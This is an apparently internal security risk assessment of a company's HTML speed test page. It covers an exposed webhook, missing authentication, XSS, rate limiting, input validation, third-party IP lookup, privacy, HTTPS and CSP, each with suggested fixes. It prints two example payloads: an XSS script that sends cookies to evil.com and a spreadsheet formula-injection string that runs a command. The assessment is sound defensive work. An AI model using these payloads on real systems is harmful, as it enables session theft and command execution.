# Security Risk Assessment — Transpro Network Speed Test

*Last updated: 2026-04-17*
*Project file: `speedtest-webpage.html`*

---

## 1. Webhook URL Exposed in Client-Side Code

**Severity: HIGH**

### Problem
The Power Automate webhook URL is hardcoded directly inside the HTML file, visible to anyone who opens the browser's "View Source" or DevTools.

### Risk
Any person — not just employees — can extract that URL and:
- POST fake/spoofed speed test results into your data.
- Flood the webhook with thousands of automated requests.
- Reverse-engineer your internal Power Automate flow structure.

### Possible Fixes
- Create a lightweight server-side proxy (Node.js, Azure Function, etc.) that holds the webhook URL and forwards validated requests. The HTML page calls your proxy, never the webhook directly.
- Add a shared secret token to requests and validate it on the server before forwarding.
- Rotate the webhook URL regularly and restrict it by IP on the Power Automate side if supported.

### Read More
- https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html

---

## 2. No Authentication — Open to Anyone

**Severity: HIGH**

### Problem
The page has no login, token, or employee verification. Anyone with the URL can submit results as any name/email they choose.

### Risk
- Fake submissions pollute your dataset (results attributed to employees who never ran the test).
- Competitors or bad actors could probe the form for information about your infrastructure.
- No way to guarantee the person submitting is actually an employee.

### Possible Fixes
- Integrate with your company's SSO (Single Sign-On) or Azure Active Directory so only authenticated employees can access the form.
- As a lightweight alternative, generate single-use access tokens sent to employee emails before they run the test.
- At minimum, add a shared passphrase field that IT communicates internally.

### Read More
- https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- https://owasp.org/www-project-top-ten/ *(A07: Identification and Authentication Failures)*

---

## 3. Cross-Site Scripting (XSS) via innerHTML

**Severity: HIGH**

### Problem
The `displayResults()` function inserts values from `ipapi.co` (ISP name, public IP) directly into the page using `innerHTML` without sanitizing or escaping them first.

```js
// Vulnerable — data.isp comes from a third-party API
results.innerHTML = `<span>${data.isp}</span>`;
```

### Risk
If `ipapi.co` is compromised, returns unexpected data, or a man-in-the-middle attack intercepts the response, a value like `<script>document.location='https://evil.com?c='+document.cookie</script>` in the ISP field would execute directly in the user's browser.

### Possible Fixes
- Replace `innerHTML` with `textContent` when inserting plain text values — this neutralizes any HTML/script injection automatically.
- If HTML rendering is required, sanitize all external data with a library like DOMPurify before inserting.
- Never trust data from third-party APIs as safe to render as HTML.

### Read More
- https://owasp.org/www-community/attacks/xss/
- https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

## 4. No Rate Limiting — Spam / Flood Risk

**Severity: MEDIUM**

### Problem
There is no limit on how many times the form can be submitted. The only protection is the button being disabled during a test, which is trivially bypassed via scripting.

### Risk
- An automated script could submit hundreds of fake results per minute, flooding your Power Automate flow and storage.
- Power Automate has execution limits; a flood could exhaust your plan quota and cause real submissions to be dropped.
- Inflated or garbage data makes analysis unreliable.

### Possible Fixes
- Add a client-side cooldown (e.g., disable re-submission for 5 minutes after a successful test).
- Implement server-side rate limiting tied to IP address (e.g., max 3 submissions per IP per hour).
- Add a CAPTCHA (e.g., Cloudflare Turnstile or Google reCAPTCHA v3) to block automated submissions.

### Read More
- https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
- https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html

---

## 5. No Input Validation or Sanitization

**Severity: MEDIUM**

### Problem
The name, email, and location fields are sent to the webhook exactly as typed, with no validation beyond the browser's built-in `required` and `type="email"` attributes (which are easily bypassed).

### Risk
- Malicious content in form fields (SQL fragments, script tags, formula injection) can propagate into whatever system Power Automate writes data to (Excel, SharePoint, Dataverse, etc.).
- If results are ever displayed in a dashboard or exported to CSV, injected content (e.g., `=CMD|'/c calc'!A0` in a name field) could trigger formula injection in spreadsheet tools.

### Possible Fixes
- Validate and sanitize all inputs server-side before writing to any data store — never rely solely on client-side validation.
- Enforce strict character allowlists for name and location fields (letters, spaces, hyphens only).
- Escape all user-supplied data before writing to spreadsheets or rendering in any UI.

### Read More
- https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- https://owasp.org/www-project-top-ten/ *(A03: Injection)*

---

## 6. Third-Party Dependency on ipapi.co

**Severity: MEDIUM**

### Problem
The page sends every user's real IP address to `https://ipapi.co/json/`, a third-party commercial service, to retrieve ISP and geo data.

### Risk
- You have no control over how ipapi.co handles, stores, or shares the IP data it receives.
- If ipapi.co experiences downtime, the entire test silently fails to gather IP/ISP info.
- A compromised or malicious response from ipapi.co feeds directly into the XSS vulnerability described in item #3.
- Free tier of ipapi.co has request limits that could be hit if usage scales.

### Possible Fixes
- Route the IP lookup through your own backend (e.g., an Azure Function) using a self-hosted GeoIP database like MaxMind GeoLite2 — no data leaves your infrastructure.
- If a third-party service is acceptable, at minimum validate and sanitize the response before using any of its fields.
- Add a fallback so the test completes even if the IP lookup fails.

### Read More
- https://owasp.org/www-project-top-ten/ *(A08: Software and Data Integrity Failures)*
- https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html

---

## 7. No Privacy Notice or Data Consent

**Severity: LOW / LEGAL**

### Problem
The page collects name, email, public IP, ISP, browser fingerprint, and machine specs, but displays no privacy notice explaining what is collected, why, how long it is stored, or who has access to it.

### Risk
- In Canada, PIPEDA requires organizations to inform individuals about what personal information is collected and obtain meaningful consent.
- If any employees are based in Europe, GDPR applies and requires explicit, informed consent before collecting personal data.
- Non-compliance can result in regulatory investigations, fines, and reputational damage.

### Possible Fixes
- Add a short disclosure above the form: *"This test collects your name, email, IP address, ISP, and device information. Results are stored by Transpro IT and used solely for network diagnostics."*
- Add a checkbox: *"I understand and consent to the collection of this data."* — required before the form can be submitted.
- Consult your legal/compliance team to confirm requirements specific to your jurisdictions.

### Read More
- https://www.priv.gc.ca/en/privacy-topics/privacy-laws-in-canada/the-personal-information-protection-and-electronic-documents-act-pipeda/ *(PIPEDA — Canada)*
- https://gdpr.eu/what-is-gdpr/ *(GDPR — Europe)*

---

## 8. No HTTPS Enforcement

**Severity: LOW**

### Problem
If the HTML file is served over plain HTTP (e.g., opened from a shared network drive or an unencrypted web server), all data is transmitted in cleartext.

### Risk
- An attacker on the same network (e.g., corporate Wi-Fi, hotel, coffee shop) could intercept the form submission and read employee names, emails, and IP data in plaintext.
- The webhook POST containing all collected data would also be visible in plaintext.

### Possible Fixes
- Always serve the page from an HTTPS endpoint (Azure Static Web Apps, SharePoint, or any TLS-enabled web server).
- Add a redirect or check that blocks usage if the page is accessed over HTTP:
  ```js
  if (location.protocol !== 'https:') location.replace('https:' + location.href.substring(5));
  ```

### Read More
- https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security
- https://owasp.org/www-project-top-ten/ *(A02: Cryptographic Failures)*

---

## 9. No Content Security Policy (CSP)

**Severity: LOW**

### Problem
There are no CSP headers or meta tags restricting which scripts, connections, or resources the page is allowed to load or contact.

### Risk
- Without CSP, if an XSS vulnerability is exploited (see item #3), the injected script has unrestricted access — it can load external resources, phone home, read form data, etc.
- CSP is a critical defense-in-depth layer that limits the blast radius of other vulnerabilities.

### Possible Fixes
- Add a `<meta>` CSP tag that whitelists only the specific origins the page needs:
  ```html
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self';
                 connect-src https://ipapi.co https://speed.cloudflare.com https://YOUR-WEBHOOK-DOMAIN;
                 script-src 'self';
                 style-src 'self' 'unsafe-inline';">
  ```
- Prefer setting CSP as an HTTP response header (stronger than meta tag).
- Use a CSP evaluator tool to test your policy before deploying.

### Read More
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- https://owasp.org/www-project-secure-headers/
- https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

---

## Risk Summary

| # | Risk | Severity | Quick Win |
|---|---|---|---|
| 1 | Webhook URL in source code | HIGH | Server-side proxy |
| 2 | No authentication | HIGH | SSO or access token |
| 3 | XSS via innerHTML | HIGH | Use `textContent` instead |
| 4 | No rate limiting | MEDIUM | Cooldown timer + CAPTCHA |
| 5 | No input validation | MEDIUM | Server-side sanitization |
| 6 | Third-party ipapi.co | MEDIUM | Backend IP lookup proxy |
| 7 | No privacy notice | LOW/LEGAL | Add consent checkbox |
| 8 | No HTTPS | LOW | Serve from HTTPS host |
| 9 | No CSP | LOW | Add CSP meta tag |

---

*For questions contact your IT Security team.*
